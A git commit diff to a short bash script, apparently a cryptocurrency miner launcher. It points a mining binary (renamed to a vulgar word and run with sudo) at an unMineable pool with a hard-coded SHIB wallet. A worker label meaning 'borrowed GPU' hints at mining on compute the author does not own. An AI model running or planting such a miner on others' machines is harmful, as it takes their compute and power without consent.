cf9d0c5dc0efc0724c7dc5672eb0df19fa662c45
yuliantiriyanti6 <88493189+yuliantiriyanti6@users.noreply.github.com>
2021-08-12 03:35:20 +0700

    Update shibacpu.sh

--- shibacpu.sh
+++ shibacpu.sh
@@ -1,11 +1,11 @@
 #!/bin/bash
 
-POOL=ethash.unmineable.com:3333
+POOL=rx-us.unmineable.com:3333
 
 WALLET=SHIB:0xf932e7CD10E3bDa943916024358951b6C5c06F02
 
 WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU-PINJEM)
 
-chmod +x tuyulgpu
+ALGO=wrkzcoin
 
-./tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
+sudo ./kontol --pool $POOL --username $WALLET.$WORKER --password x --algorithm $ALGO --disableCPU
